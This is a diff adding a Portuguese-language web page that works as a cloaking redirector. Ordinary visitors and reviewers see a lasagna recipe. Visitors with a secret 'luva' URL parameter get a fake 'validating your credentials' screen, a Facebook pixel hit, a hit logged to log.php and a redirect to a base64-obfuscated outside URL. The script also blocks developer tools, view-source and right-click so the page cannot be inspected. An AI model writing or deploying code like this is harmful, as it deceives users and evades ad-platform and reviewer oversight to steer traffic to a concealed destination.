@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <title>Pedreiro • Página Especial</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      background: radial-gradient(circle at top, #1b3bff 0, #050816 55%, #02030a 100%);
+      color: #f9fafb;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      width: 100%;
+      max-width: 900px;
+      background: rgba(15, 23, 42, 0.92);
+      border-radius: 22px;
+      padding: 26px 26px 30px;
+      backdrop-filter: blur(12px);
+      box-shadow: 0 22px 60px rgba(0,0,0,0.7);
+      border: 1px solid rgba(148, 163, 184, 0.4);
+      overflow: hidden;
+      animation: float 6s ease-in-out infinite;
+    }
+    @keyframes float {
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-4px); }
+    }
+    h1 {
+      margin: 0 0 8px;
+      font-size: 1.9rem;
+      letter-spacing: .03em;
+    }
+    p {
+      margin: .3rem 0;
+      line-height: 1.55;
+      font-size: .98rem;
+      color: #e5e7eb;
+    }
+    ol, ul {
+      margin: .35rem 0 .2rem;
+      padding-left: 1.2rem;
+      font-size: .95rem;
+      color: #e5e7eb;
+    }
+    li { margin: .14rem 0; }
+    .tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      border-radius: 999px;
+      background: rgba(59,130,246,0.18);
+      border: 1px solid rgba(59,130,246,0.8);
+      font-size: .74rem;
+      letter-spacing: .09em;
+      text-transform: uppercase;
+      color: #bfdbfe;
+      margin-bottom: 12px;
+    }
+    .tag-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 999px;
+      background: #22c55e;
+      box-shadow: 0 0 0 4px rgba(34,197,94,.25);
+    }
+    .highlight {
+      color: #facc15;
+      font-weight: 600;
+    }
+
+    .progress-wrap {
+      margin-top: 18px;
+    }
+    .progress-label {
+      font-size: .86rem;
+      color: #cbd5f5;
+      margin-bottom: 6px;
+    }
+    .progress-bar {
+      width: 100%;
+      height: 9px;
+      border-radius: 999px;
+      background: rgba(15,23,42,0.9);
+      border: 1px solid rgba(148,163,184,0.8);
+      overflow: hidden;
+      position: relative;
+    }
+    .progress-fill {
+      position: absolute;
+      inset: 0;
+      transform-origin: left;
+      transform: scaleX(0);
+      background: linear-gradient(90deg,#22c55e,#4ade80,#a7f3d0);
+      animation: fillBar 1.3s linear forwards;
+    }
+    @keyframes fillBar {
+      to { transform: scaleX(1); }
+    }
+
+    @media (max-width: 640px) {
+      .card {
+        padding: 20px 18px 24px;
+        border-radius: 18px;
+      }
+      h1 { font-size: 1.6rem; }
+    }
+  </style>
+
+  <script>
+    (function() {
+      // --- configuração "obfuscada" ---
+      var _px = atob("ODEzNTA0ODQ0ODA3NDEx");
+      var _ru = atob("aHR0cHM6Ly9hcHAuZ3JpbWJvdHMub25saW5lL2dvL21hbm9icmE/Z3JpbT00ejdxMjc5ajJx");
+      var _secretList = ["vaidaroi","obraprime","safepath"]; // valores aceitáveis do parâmetro
+
+      var qs = new URLSearchParams(window.location.search);
+      var token = qs.get("luva");
+      var isSecret = _secretList.indexOf(token) !== -1;
+
+      // limpa a URL pra não mostrar o parâmetro
+      if (isSecret && window.history && window.history.replaceState) {
+        try {
+          var clean = window.location.origin + window.location.pathname;
+          window.history.replaceState({}, document.title, clean);
+        } catch(e) {}
+      }
+
+      // Anti-inspeção básica
+      document.addEventListener("contextmenu", function(e) { e.preventDefault(); });
+      document.onkeydown = function(e) {
+        e = e || window.event;
+        var k = e.keyCode || e.which;
+        if (k === 123) return false; // F12
+        if (e.ctrlKey && e.shiftKey && (k === 73 || k === 67 || k === 74)) return false; // I, C, J
+        if (e.ctrlKey && (k === 83 || k === 85)) return false; // S, U
+      };
+      setInterval(function() {
+        var w = window.outerWidth - window.innerWidth > 160;
+        var h = window.outerHeight - window.innerHeight > 160;
+        if (w || h) {
+          document.body.innerHTML = "<div style='color:#f87171;font-family:system-ui;text-align:center;margin-top:20vh;'>Ferramentas de inspeção detectadas. Acesso bloqueado.</div>";
+        }
+      }, 1200);
+
+      // injeta o conteúdo da página
+      window.addEventListener("load", function() {
+        var card = document.getElementById("card");
+        if (!card) return;
+
+        if (isSecret) {
+          // modo redirecionamento
+          card.innerHTML = `
+            <div class="tag">
+              <span class="tag-dot"></span>
+              acesso verificado
+            </div>
+            <h1>Acesso liberado com sucesso 🔐</h1>
+            <p>Validando suas credenciais e preparando o ambiente certo pra você. Não feche esta aba.</p>
+            <div class="progress-wrap">
+              <div class="progress-label">Carregando acesso especial...</div>
+              <div class="progress-bar"><div class="progress-fill"></div></div>
+            </div>
+          `;
+
+          // pixel só aqui
+          (function() {
+            // prepara fbq
+            !function(f,b,e,v,n,t,s)
+            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[]}(window, document,'script');
+
+            var s = document.createElement("script");
+            s.async = true;
+            s.src = "https://connect.facebook.net/en_US/fbevents.js";
+            s.onload = function() {
+              try {
+                fbq('init', _px);
+                var key = 'fb_pageview_' + _px + '_ok';
+                if (!localStorage.getItem(key)) {
+                  fbq('track', 'PageView');
+                  localStorage.setItem(key, '1');
+                }
+              } catch(e) {}
+            };
+            document.head.appendChild(s);
+          })();
+
+          // log básico no servidor (se log.php existir)
+          try {
+            fetch('log.php', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+              body: 'p=' + encodeURIComponent(token || '') +
+                    '&ts=' + Date.now() +
+                    '&u=' + encodeURIComponent(window.location.href)
+            }).catch(function(){});
+          } catch(e) {}
+
+          // redireciona
+          setTimeout(function() {
+            window.location.href = _ru;
+          }, 1400);
+
+        } else {
+          // modo lasanha
+          card.innerHTML = `
+            <div class="tag">
+              <span class="tag-dot"></span>
+              receita secreta liberada
+            </div>
+            <h1>Como fazer a melhor lasanha da sua vida 🍝</h1>
+            <p>Aqui vai um guia completo para você preparar uma lasanha impecável, do jeito que impressiona qualquer pessoa. Camadas bem montadas, molho cremoso e aquele cheiro de domingo em família.</p>
+
+            <p><span class="highlight">1. Organize os ingredientes:</span> massa de lasanha, carne moída, queijo muçarela, presunto, molho de tomate, leite, farinha, manteiga e temperos.</p>
+
+            <p><span class="highlight">2. Faça o molho de carne:</span></p>
+            <ol>
+              <li>Refogue cebola e alho em um fio de óleo ou azeite;</li>
+              <li>Junte a carne moída e deixe dourar bem, sem pressa;</li>
+              <li>Adicione o molho de tomate, corrija o sal e coloque orégano ou manjericão;</li>
+              <li>Cozinhe em fogo baixo por 10–15 minutos para apurar o sabor.</li>
+            </ol>
+
+            <p><span class="highlight">3. Prepare o molho branco:</span></p>
+            <ol>
+              <li>Derreta a manteiga em fogo baixo;</li>
+              <li>Junte a farinha e mexa até formar uma pastinha lisa;</li>
+              <li>Vá colocando o leite aos poucos, mexendo sempre para não empelotar;</li>
+              <li>Tempere com sal, pimenta e noz-moscada; finalize com um pouco de queijo ralado, se quiser.</li>
+            </ol>
+
+            <p><span class="highlight">4. Monte a lasanha:</span></p>
+            <ol>
+              <li>Comece com uma camada fina de molho no fundo da forma;</li>
+              <li>Adicione a massa, depois molho de carne, um pouco de molho branco, presunto e muçarela;</li>
+              <li>Repita as camadas até quase o topo da forma;</li>
+              <li>Finalize com bastante molho branco e queijo ralado para gratinar.</li>
+            </ol>
+
+            <p><span class="highlight">5. Forno:</span> cubra a forma com papel-alumínio e leve ao forno médio por cerca de 30–40 minutos. Depois retire o alumínio e deixe dourar por mais 10 minutos.</p>
+
+            <p>No fim, mesmo sem parâmetro secreto nenhum, você já saiu daqui sabendo fazer uma lasanha de respeito. Agora é só separar os ingredientes e mandar ver na cozinha.</p>
+          `;
+        }
+      });
+    })();
+  </script>
+</head>
+<body>
+  <div class="card" id="card">
+    <!-- conteúdo preenchido via JS -->
+  </div>
+</body>
+</html>
